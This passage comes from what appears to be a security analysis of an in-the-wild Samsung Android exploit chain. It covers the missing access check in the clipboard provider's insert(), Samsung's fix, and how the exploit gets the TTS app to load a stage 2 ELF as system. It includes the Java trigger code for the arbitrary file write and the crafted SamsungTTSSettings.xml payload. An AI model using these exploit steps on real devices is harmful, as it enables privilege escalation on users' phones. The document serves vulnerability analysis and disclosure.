 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">long</span><span class="vdnyYxSRCi-c4">&nbsp;row </span><span class="vdnyYxSRCi-c0">=</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c5">this</span><span class="vdnyYxSRCi-c0">.</span><span class="vdnyYxSRCi-c4">database</span><span class="vdnyYxSRCi-c0">.</span><span class="vdnyYxSRCi-c4">insert</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">TABLE_NAME</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c18">&quot;&quot;</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;values</span><span class="vdnyYxSRCi-c0">);</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">if</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">row </span><span class="vdnyYxSRCi-c0">&gt;</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c13">0</span><span class="vdnyYxSRCi-c0">)</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">{</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c12">Uri</span><span class="vdnyYxSRCi-c4">&nbsp;newUri </span><span class="vdnyYxSRCi-c0">=</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c12">ContentUris</span><span class="vdnyYxSRCi-c0">.</span><span class="vdnyYxSRCi-c4">withAppendedId</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">CONTENT_URI</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;row</span><span class="vdnyYxSRCi-c0">);</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; getContext</span><span class="vdnyYxSRCi-c0">().</span><span class="vdnyYxSRCi-c4">getContentResolver</span><span class="vdnyYxSRCi-c0">().</span><span class="vdnyYxSRCi-c4">notifyChange</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">newUri</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c5">null</span><span class="vdnyYxSRCi-c0">);</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">return</span><span class="vdnyYxSRCi-c4">&nbsp;newUri</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c0">}</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">throw</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c5">new</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c12">SQLException</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c18">&quot;Fail to add a new record into &quot;</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">+</span><span class="vdnyYxSRCi-c4">&nbsp;uri</span><span class="vdnyYxSRCi-c0">);</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; </span><span class="vdnyYxSRCi-c0">}</span></p></td></tr></table>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span>The function above is the vulnerable </span><span class="vdnyYxSRCi-c2">insert()</span><span>&nbsp;method in </span><span class="vdnyYxSRCi-c2">com.android.server.semclipboard.SemClipboardProvider</span><span>. </span><span>There is no access control included in this function</span><span>&nbsp;so any app, including the </span><span class="vdnyYxSRCi-c2">untrusted_app</span><span>&nbsp;SELinux context, can modify the </span><span class="vdnyYxSRCi-c2">_data</span><span>&nbsp;column directly</span><span>.</span><span>&nbsp;By calling </span><span class="vdnyYxSRCi-c2">insert</span><span class="vdnyYxSRCi-c7">, an app can open files via the system server that it wouldn&rsquo;t usually be able to open on its own.</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span class="vdnyYxSRCi-c7">The exploit triggered the vulnerability with the following code from an untrusted application on the device. This code returned a raw file descriptor.</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p><a id="t.c76d3f2b81f0b5658486a0f765013fc550b7979d"></a><a id="t.2"></a><table class="vdnyYxSRCi-c23"><tr class="vdnyYxSRCi-c19"><td class="vdnyYxSRCi-c10" colspan="1" rowspan="1">
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c12">ContentValues</span><span class="vdnyYxSRCi-c4">&nbsp;vals </span><span class="vdnyYxSRCi-c0">=</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c5">new</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c12">ContentValues</span><span class="vdnyYxSRCi-c0">();</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">vals</span><span class="vdnyYxSRCi-c0">.</span><span class="vdnyYxSRCi-c4">put</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c18">&quot;_data&quot;</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c18">&quot;/data/system/users/0/newFile.bin&quot;</span><span class="vdnyYxSRCi-c0">);</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">URI semclipboard_uri </span><span class="vdnyYxSRCi-c0">=</span><span class="vdnyYxSRCi-c4">&nbsp;URI</span><span class="vdnyYxSRCi-c0">.</span><span class="vdnyYxSRCi-c4">parse</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c18">&quot;content://com.sec.android.semclipboardprovider&quot;</span><span class="vdnyYxSRCi-c0">)</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c12">ContentResolver</span><span class="vdnyYxSRCi-c4">&nbsp;resolver </span><span class="vdnyYxSRCi-c0">=</span><span class="vdnyYxSRCi-c4">&nbsp;getContentResolver</span><span class="vdnyYxSRCi-c0">();</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">URI newFile_uri </span><span class="vdnyYxSRCi-c0">=</span><span class="vdnyYxSRCi-c4">&nbsp;resolver</span><span class="vdnyYxSRCi-c0">.</span><span class="vdnyYxSRCi-c4">insert</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">semclipboard_uri</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;vals</span><span class="vdnyYxSRCi-c0">);</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c5">return</span><span class="vdnyYxSRCi-c4">&nbsp;resolver</span><span class="vdnyYxSRCi-c0">.</span><span class="vdnyYxSRCi-c4">openFileDescriptor</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">newFile_uri</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c18">&quot;w&quot;</span><span class="vdnyYxSRCi-c0">).</span><span class="vdnyYxSRCi-c4">getFd</span><span class="vdnyYxSRCi-c0">();</span><span class="vdnyYxSRCi-c4">&nbsp;</span></p></td></tr></table>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span class="vdnyYxSRCi-c7">Let&rsquo;s walk through what is happening line by line:</span></p><ol class="c36 lst-kix_olk2lnn0afau-0 start" start="1"><li style="margin-left: 46pt;" class="c1 c21 c8 li-bullet-0"><span>Create a </span><span class="vdnyYxSRCi-c24"><a class="vdnyYxSRCi-c61" href="https://developer.android.com/reference/android/content/ContentValues">ContentValues</a></span><span class="vdnyYxSRCi-c7">&nbsp;object. This holds the key, value pair that the caller wants to insert into a provider&rsquo;s database table. The key is the column name and the value is the row entry.</span></li><li style="margin-left: 46pt;" class="c1 c8 c21 li-bullet-0"><span class="vdnyYxSRCi-c7">Set the ContentValues object: the key is set to &ldquo;_data&rdquo; and the value to an arbitrary file path, controlled by the exploit.</span></li><li style="margin-left: 46pt;" class="c1 c21 c8 li-bullet-0"><span>Get the URI to access the </span><span class="vdnyYxSRCi-c2">semclipboardprovider</span><span>. This is set in the </span><span class="vdnyYxSRCi-c2">SemClipboardProvider</span><span class="vdnyYxSRCi-c7">&nbsp;class.</span></li><li style="margin-left: 46pt;" class="c1 c21 c8 li-bullet-0"><span>Get the </span><span class="vdnyYxSRCi-c24"><a class="vdnyYxSRCi-c61" href="https://developer.android.com/reference/android/content/ContentResolver">ContentResolver</a></span><span class="vdnyYxSRCi-c7">&nbsp;object that allows apps access to ContentProviders.</span></li><li style="margin-left: 46pt;" class="c1 c21 c8 li-bullet-0"><span>Call </span><span class="vdnyYxSRCi-c2">insert</span><span>&nbsp;on the </span><span class="vdnyYxSRCi-c2">semclipboardprovider</span><span class="vdnyYxSRCi-c7">&nbsp;with our key-value pair.</span></li><li style="margin-left: 46pt;" class="c1 c21 c8 li-bullet-0"><span>Open the file that was passed in as the value and return the raw file descriptor. </span><span class="vdnyYxSRCi-c2">openFileDescriptor</span><span>&nbsp;calls the content provider&rsquo;s </span><span class="vdnyYxSRCi-c2">openFile</span><span>, which in this case simply calls </span><span class="vdnyYxSRCi-c2">openFileHelper</span><span class="vdnyYxSRCi-c7">.</span></li></ol>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span>Th</span><span>e</span><span>&nbsp;exploit wrote their next stage binary to the directory </span><span class="vdnyYxSRCi-c2">/data/system/users/0/</span><span>. The dropped file will have an SELinux context of </span><span class="vdnyYxSRCi-c2">users_system_data_file</span><span>. Normal </span><span class="vdnyYxSRCi-c2">untrusted_app</span><span>&rsquo;s don&rsquo;t have access to open or create </span><span class="vdnyYxSRCi-c2">users_system_data_file</span><span>&nbsp;files so in this case they are proxying the open through </span><span class="vdnyYxSRCi-c2">system_server</span><span>&nbsp;who can open </span><span class="vdnyYxSRCi-c2">users_system_data_file</span><span>. While </span><span class="vdnyYxSRCi-c2">untrusted_app</span><span>&nbsp;can&rsquo;t open </span><span class="vdnyYxSRCi-c2">users_system_data_file</span><span>, it can read and write to </span><span class="vdnyYxSRCi-c2">users_system_data_file</span><span class="vdnyYxSRCi-c7">. Once the clipboard content provider opens the file and passess the fd to the calling process, the calling process can now read and write to it.</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span class="vdnyYxSRCi-c7">The exploit first uses this fd to write their next stage ELF file onto the file system. The contents for the stage 2 ELF were embedded within the original sample.</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span class="vdnyYxSRCi-c7">This vulnerability is triggered three more times throughout the chain as we&rsquo;ll see below.</span></p><h2 class="vdnyYxSRCi-c17 vdnyYxSRCi-c8" id="h.a85my9321daw"><span class="vdnyYxSRCi-c16">Fixing the vulnerability</span></h2>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span>To fix the vulnerability, Samsung added access checks to the functions in the </span><span class="vdnyYxSRCi-c2">SemClipboardProvider</span><span>. </span><span>The </span><span class="vdnyYxSRCi-c2">insert</span><span>&nbsp;method now checks if the PID of the calling process is UID 1000, meaning that it is already also running with system privileges.</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p><a id="t.b1677b3cf45fa7aae1529da0f69fbe999785be5f"></a><a id="t.3"></a><table class="vdnyYxSRCi-c23"><tr class="vdnyYxSRCi-c19"><td class="vdnyYxSRCi-c10" colspan="1" rowspan="1">
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; </span><span class="vdnyYxSRCi-c5">public</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c12">Uri</span><span class="vdnyYxSRCi-c4">&nbsp;insert</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c12">Uri</span><span class="vdnyYxSRCi-c4">&nbsp;uri</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c12">ContentValues</span><span class="vdnyYxSRCi-c4">&nbsp;values</span><span class="vdnyYxSRCi-c0">)</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">{</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5 vdnyYxSRCi-c9">if</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">&nbsp;</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c9">(</span><span class="vdnyYxSRCi-c12 vdnyYxSRCi-c9">Binder</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c9">.</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">getCallingUid</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c9">()</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">&nbsp;</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c9">!=</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">&nbsp;</span><span class="vdnyYxSRCi-c13 vdnyYxSRCi-c9">1000</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c9">)</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">&nbsp;</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c9">{</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c12">Log</span><span class="vdnyYxSRCi-c0">.</span><span class="vdnyYxSRCi-c4">e</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">TAG</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c18">&quot;Fail to insert image clip uri. blocked the access of package : &quot;</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">+</span><span class="vdnyYxSRCi-c4">&nbsp;getContext</span><span class="vdnyYxSRCi-c0">().</span><span class="vdnyYxSRCi-c4">getPackageManager</span><span class="vdnyYxSRCi-c0">().</span><span class="vdnyYxSRCi-c4">getNameForUid</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c12">Binder</span><span class="vdnyYxSRCi-c0">.</span><span class="vdnyYxSRCi-c4">getCallingUid</span><span class="vdnyYxSRCi-c0">()));</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">return</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c5">null</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c0">}</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">long</span><span class="vdnyYxSRCi-c4">&nbsp;row </span><span class="vdnyYxSRCi-c0">=</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c5">this</span><span class="vdnyYxSRCi-c0">.</span><span class="vdnyYxSRCi-c4">database</span><span class="vdnyYxSRCi-c0">.</span><span class="vdnyYxSRCi-c4">insert</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">TABLE_NAME</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c18">&quot;&quot;</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;values</span><span class="vdnyYxSRCi-c0">);</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">if</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">row </span><span class="vdnyYxSRCi-c0">&gt;</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c13">0</span><span class="vdnyYxSRCi-c0">)</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">{</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c12">Uri</span><span class="vdnyYxSRCi-c4">&nbsp;newUri </span><span class="vdnyYxSRCi-c0">=</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c12">ContentUris</span><span class="vdnyYxSRCi-c0">.</span><span class="vdnyYxSRCi-c4">withAppendedId</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">CONTENT_URI</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;row</span><span class="vdnyYxSRCi-c0">);</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; getContext</span><span class="vdnyYxSRCi-c0">().</span><span class="vdnyYxSRCi-c4">getContentResolver</span><span class="vdnyYxSRCi-c0">().</span><span class="vdnyYxSRCi-c4">notifyChange</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">newUri</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c5">null</span><span class="vdnyYxSRCi-c0">);</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">return</span><span class="vdnyYxSRCi-c4">&nbsp;newUri</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c0">}</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">throw</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c5">new</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c12">SQLException</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c18">&quot;Fail to add a new record into &quot;</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">+</span><span class="vdnyYxSRCi-c4">&nbsp;uri</span><span class="vdnyYxSRCi-c0">);</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; </span><span class="vdnyYxSRCi-c0">}</span></p></td></tr></table><h2 class="vdnyYxSRCi-c17 vdnyYxSRCi-c8" id="h.qqt6xm6hc0pl"><span class="vdnyYxSRCi-c16">Executing the stage 2 ELF</span></h2>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span>The exploit has now written its stage 2 binary to the file system, but how do they load </span><span>it</span><span class="vdnyYxSRCi-c7">&nbsp;outside of their current app sandbox? Using the Samsung Text to Speech application (SamsungTTS.apk).</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span>The </span><span class="vdnyYxSRCi-c24"><a class="vdnyYxSRCi-c61" href="https://galaxystore.samsung.com/detail/com.samsung.SMT?langCd=en">Samsung Text to Speech application (com.samsung.SMT)</a></span><span>&nbsp;is a pre-installed system app running on Samsung devices. It is also running as the system UID, though as a slightly less privileged SELinux context, </span><span class="vdnyYxSRCi-c2">system_app</span><span>&nbsp;rather than </span><span class="vdnyYxSRCi-c2">system_server</span><span>. There has been at least one previously public vulnerability where this app was used</span><span class="vdnyYxSRCi-c24"><a class="vdnyYxSRCi-c61" href="https://blog.flanker017.me/text-to-speech-speaks-pwned/">&nbsp;to gain code execution as system</a></span><span class="vdnyYxSRCi-c7">. What&rsquo;s different this time though is that the exploit doesn&rsquo;t need another vulnerability; instead it reuses the stage 1 vulnerability in the clipboard to arbitrarily write files on the file system.</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span>Older versions of the SamsungTTS application stored the file path for their engine in their Settings files. When a service in the application was started, it obtained the path from the Settings file and would load that file path as a native library using the </span><span class="vdnyYxSRCi-c24 vdnyYxSRCi-c46"><a class="vdnyYxSRCi-c61" href="https://developer.android.com/reference/java/lang/System#load(java.lang.String)">System.load</a></span><span class="vdnyYxSRCi-c7">&nbsp;API. </span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span>The exploit takes advantage of this by using the stage 1 vulnerability to write its file path to the Settings file and then starting the service which will then load its stage 2 executable file as system UID and </span><span class="vdnyYxSRCi-c2">system_app</span><span class="vdnyYxSRCi-c7">&nbsp;SELinux context.</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span>To do this, the exploit uses the stage 1 vulnerability to write the following contents to two different files: </span><span class="vdnyYxSRCi-c2">/data/user_de/0/com.samsung.SMT/shared_prefs/SamsungTTSSettings.xml</span><span>&nbsp;and </span><span class="vdnyYxSRCi-c2">/data/data/com.samsung.SMT/shared_prefs/SamsungTTSSettings.xml</span><span class="vdnyYxSRCi-c7">. Depending on the version of the phone and application, the SamsungTTS app uses these 2 different paths for its Settings files.</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p><a id="t.1e9fc9b7503d012c58ac54bface058bfa0e1cf3d"></a><a id="t.4"></a><table class="vdnyYxSRCi-c23"><tr class="vdnyYxSRCi-c19"><td class="vdnyYxSRCi-c10" colspan="1" rowspan="1">
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c0">&lt;?</span><span class="vdnyYxSRCi-c4">xml version</span><span class="vdnyYxSRCi-c0">=</span><span class="vdnyYxSRCi-c18">&#39;1.0&#39;</span><span class="vdnyYxSRCi-c4">&nbsp;encoding</span><span class="vdnyYxSRCi-c0">=</span><span class="vdnyYxSRCi-c18">&#39;utf-8&#39;</span><span class="vdnyYxSRCi-c4">&nbsp;standalone</span><span class="vdnyYxSRCi-c0">=</span><span class="vdnyYxSRCi-c18">&#39;yes&#39;</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">?&gt;</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c25">&lt;map&gt;</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c25">&lt;string</span><span class="vdnyYxSRCi-c4">&nbsp;name</span><span class="vdnyYxSRCi-c0">=</span><span class="vdnyYxSRCi-c4">\&quot;eng-USA-Variant Info\&quot;</span><span class="vdnyYxSRCi-c25">&gt;</span><span class="vdnyYxSRCi-c4">f00</span><span class="vdnyYxSRCi-c25">&lt;/string&gt;</span><span class="vdnyYxSRCi-c3">\n&quot;</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c25">&lt;string</span><span class="vdnyYxSRCi-c4">&nbsp;name</span><span class="vdnyYxSRCi-c0">=</span><span class="vdnyYxSRCi-c4">\&quot;SMT_STUBCHECK_STATUS\&quot;</span><span class="vdnyYxSRCi-c25">&gt;</span><span class="vdnyYxSRCi-c4">STUB_SUCCESS</span><span class="vdnyYxSRCi-c25">&lt;/string&gt;</span><span class="vdnyYxSRCi-c3">\n&quot;</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c25">&lt;string</span><span class="vdnyYxSRCi-c4">&nbsp;name</span><span class="vdnyYxSRCi-c0">=</span><span class="vdnyYxSRCi-c4">\&quot;SMT_LATEST_INSTALLED_ENGINE_PATH\&quot;</span><span class="vdnyYxSRCi-c25">&gt;</span><span class="vdnyYxSRCi-c4">/data/system/users/0/newFile.bin</span><span class="vdnyYxSRCi-c25">&lt;/string&gt;</span><span class="vdnyYxSRCi-c3">\n&quot;</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c25">&lt;/map&gt;</span></p></td></tr></table>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span>The </span><span class="vdnyYxSRCi-c2">SMT_LATEST_INSTALLED_ENGINE_PATH</span><span>&nbsp;is the file path passed to </span><span class="vdnyYxSRCi-c2">System.load()</span><span>. To initiate the process of the system loading, the exploit stops and restarts the </span><span class="vdnyYxSRCi-c2">SamsungTTSService</span><span>&nbsp;by sending two intents to the application. The </span><span class="vdnyYxSRCi-c2">SamsungTTSService</span><span>&nbsp;then initiates the load and the stage 2 ELF begins executing as the system user in the </span><span class="vdnyYxSRCi-c2">system_app</span><span class="vdnyYxSRCi-c7">&nbsp;SELinux context. </span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span class="vdnyYxSRCi-c7">The exploit sample is from at least November 2020. As of November 2020, some devices had a version of the SamsungTTS app that did this arbitrary file loading while others did not. App versions 3.0.04.14 and before included the arbitrary loading capability. It seems like devices released on Android 10 (Q) were released with the updated version of the SamsungTTS app which did not load an ELF file based on the path in the settings file. For example, the A51 device that launched in late 2019 on Android 10 launched with version 3.0.08.18 of the SamsungTTS app, which does not include the functionality that would load the ELF.</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span>Phones released on Android P and earlier seemed to have a version of the app pre-3.0.08.18 which does load the executable up through December 2020. For example, the SamsungTTS app from </span><span class="vdnyYxSRCi-c24"><a class="vdnyYxSRCi-c61" href="https://www.sammobile.com/samsung/galaxy-a50/firmware/SM-A505F/XID/download/A505FDDS5BTJA/517463/">this A50 device</a></span><span class="vdnyYxSRCi-c7">&nbsp;on the November 2020 security patch level was 3.0.03.22, which did load from the Settings file. </span></p>
